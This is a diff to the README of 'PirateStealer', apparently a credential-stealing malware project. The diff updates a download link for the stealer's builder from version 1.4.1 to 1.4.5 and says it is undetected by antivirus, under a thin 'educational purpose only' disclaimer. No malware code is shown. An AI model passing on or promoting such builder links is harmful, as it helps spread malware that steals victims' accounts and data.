@@ -1,6 +1,6 @@
 #### ⚠️ Proof Of Concept && Educational Purpose Only && KingFA == Skid⚠️
 # PirateStealer 
-# Click here [Builder](https://github.com/bytixo/PirateStealer/releases/download/1.4.1/PirateStealerBuilder.zip) (Undected as of now)
+# Click here [Builder](https://github.com/bytixo/PirateStealer/releases/download/1.4.5/PirateStealerBuilder.zip) (Undected as of now)
 
 ## Read this please
 I'm not the original owner of this repository
